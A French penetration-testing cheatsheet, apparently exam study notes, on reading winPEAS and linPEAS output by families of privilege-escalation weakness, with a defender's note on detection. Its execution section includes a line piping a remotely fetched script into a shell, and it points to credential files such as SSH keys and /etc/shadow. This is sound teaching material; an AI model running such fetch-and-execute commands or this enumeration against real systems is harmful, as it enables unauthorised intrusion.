# Cheatsheet — Lire la sortie PEAS (winPEAS / linPEAS)

winPEAS et linPEAS crachent des **centaines de lignes**. La compétence n'est pas de les lire de haut en bas — c'est de les **filtrer par familles** pour trouver la piste d'élévation la plus simple. Cette fiche vaut pour n'importe quelle machine.

> ⚠️ **Cadre.** Énumération sur labs et périmètres autorisés uniquement (art. 323-1).

---

## 1. Règle n°1 — les couleurs avant tout

PEAS donne sa légende en tête de sortie :

| Couleur | Sens | Réflexe |
| --- | --- | --- |
| **Rouge** | Privilège spécial ou **mauvaise configuration** | 👀 regarder ici en premier |
| **Vert** | Protection active / bien configuré | ignorer |
| Cyan | Utilisateur actif | contexte |
| Bleu | Utilisateur désactivé | contexte |
| Jaune clair | Lien / doc | contexte |

⚠️ **Si tu rediriges dans un fichier (`> out.txt`), tu perds les couleurs.** Deux parades :
- lire directement dans un terminal qui gère l'ANSI, ou
- lancer avec `--no-color` et parcourir avec la **checklist des familles** ci-dessous en tête.

---

## 2. Règle n°2 — lire par familles, pas en linéaire

Une privesc tombe presque toujours dans une famille connue. Tu parcours la sortie en **cochant cette checklist**, par ordre de rentabilité (le plus propre d'abord, le noyau en dernier recours).

### Windows

| # | Famille | Section winPEAS | Ce qui est « rouge » |
| --- | --- | --- | --- |
| 1 | **Privilèges du jeton** | `Current Token privileges` | `SeImpersonate`/`SeAssignPrimaryToken` → famille **Potato** ; `SeBackup`, `SeDebug`, `SeRestore`, `SeTakeOwnership` |
| 2 | **Identifiants qui traînent** | `AutoLogon`, `saved credentials`, `Wdigest`, `unattend/sysprep`, `PS history`, `Registry (CurrentPass)` | tout mot de passe en clair |
| 3 | **OS non patché** | `Basic System Information` (hotfixes) + `Windows Version Vulnerabilities` | peu de KB + version ancienne → **exploit noyau** |
| 4 | **Services** | `Modifiable Services`, `unquoted paths`, `service registry`, `writable service DLL` | « you **CAN** modify… », chemin non quoté |
| 5 | **AlwaysInstallElevated** | section dédiée | « is available » → MSI en SYSTEM |
| 6 | **Tâches planifiées** | `Scheduled Applications`, `writable tasks` | cible (exe/script) modifiable |
| 7 | **DLL hijacking / PATH** | `write permissions in PATH folders` | dossier du PATH inscriptible |
| 8 | **Processus / réseau** | `Interesting Processes`, `Listening Ports` | binaire tiers modifiable, service interne (**pivot**) |

### Linux (linPEAS)

| # | Famille | Où regarder | Ce qui est « rouge » (95% highlight) |
| --- | --- | --- | --- |
| 1 | **sudo** | `sudo -l` | binaire lançable en root → **GTFOBins** |
| 2 | **SUID / SGID** | `SUID`, `SGID` | binaire SUID non standard → GTFOBins |
| 3 | **Capabilities** | `Capabilities` | `cap_setuid`, `cap_dac_read_search` sur python/perl/... |
| 4 | **Cron** | `Cron jobs` | script root modifiable, wildcard, PATH relatif |
| 5 | **Identifiants** | `Analyzing … files`, historique, `.config`, `.env`, clés SSH | mots de passe, `id_rsa` |
| 6 | **Fichiers inscriptibles** | `Interesting writable files`, `/etc/passwd`, `/etc/shadow` | `/etc/passwd` inscriptible, service unit modifiable |
| 7 | **PATH / lib** | `PATH`, `LD_PRELOAD/LD_LIBRARY_PATH` | dossier du PATH inscriptible, NOPASSWD env_keep |
| 8 | **Noyau** | `Kernel`, distrib + version | version vulnérable (**dernier recours**) |

> linPEAS surligne les meilleures pistes avec un fond **jaune/rouge** et la mention `95% special permissions`. Commence par celles-là.

---

## 3. La méthode d'élimination (l'état d'esprit de l'oral)

On ne cherche pas « la » faille, on **écarte** les familles une à une jusqu'à celle qui reste :

```
Jeton exploitable ?  → non
Creds en clair ?     → non
Service modifiable ? → non
Tâche writable ?     → non
AlwaysInstallElev. ? → non
──────────────────────────
OS très peu patché ? → OUI → chemin noyau
```

C'est exactement ce raisonnement qu'on te demande à l'oral : « j'ai écarté jeton, services, tâches, creds → donc noyau ». Note **chaque** piste dans ta fiche machine, **même écartée** (« services → non modifiables »), ça montre la rigueur.

---

## 4. Le bruit à ignorer

- **Listes géantes de drivers**, `Internet Settings`, `.NET versions`, tables réseau interminables : du contexte, rarement la faille.
- **Exceptions** (`Method not found: System.Array.Empty`, erreurs yaml) sur les vieux Windows (2012 R2…) : winPEAS tourne sur un vieux .NET → **normal, sans impact**.
- Codes `T1082`, `T1068`… dans les titres = **tags MITRE ATT&CK**, pas des résultats.
- « You must be an administrator to run this check » : normal tant que tu n'es pas admin.

---

## 5. Bonnes pratiques d'exécution

```bash
# Windows — garder la sortie lisible et l'archiver
wp.exe --no-color > C:\Windows\Temp\peas.txt      # puis rapatrier et lire au calme
wp.exe systeminfo userinfo                         # cibler des modules si besoin

# Linux
./linpeas.sh -a | tee linpeas.txt                  # -a = all checks
curl http://IP/linpeas.sh | sh                     # exécution en mémoire (script)
```

- Rapatrie le `.txt` sur Kali (voir [file-transfer](file-transfer.md)) et lis-le dans `less -R` (garde les couleurs) plutôt que de scroller dans un shell instable.
- Croise toujours avec une **énumération manuelle** (`whoami /priv`, `sudo -l`) : PEAS est un accélérateur, pas une vérité absolue.

---

## 6. À savoir expliquer à l'oral

- **Pourquoi filtrer par familles** : une privesc appartient à un nombre fini de catégories ; les connaître transforme 500 lignes en une checklist de 8 points.
- **L'ordre de préférence** : creds/jeton (propre) avant noyau (risqué, peut planter la cible — inacceptable en prod/OT).
- **Rouge vs vert** : rouge = misconfig/privilège, vert = protection ; on chasse le rouge.
- **PEAS ≠ oracle** : il accélère l'énumération mais on valide à la main et on comprend *pourquoi* la piste marche (pour le rapport et le correctif).
- **Côté défense** : l'exécution de winPEAS/linPEAS est très bruyante (des milliers de lectures registre/fichiers, requêtes WMI) → un EDR/SIEM la détecte ; c'est un argument Blue Team (corréler un pic d'énumération avec un compte non-admin).
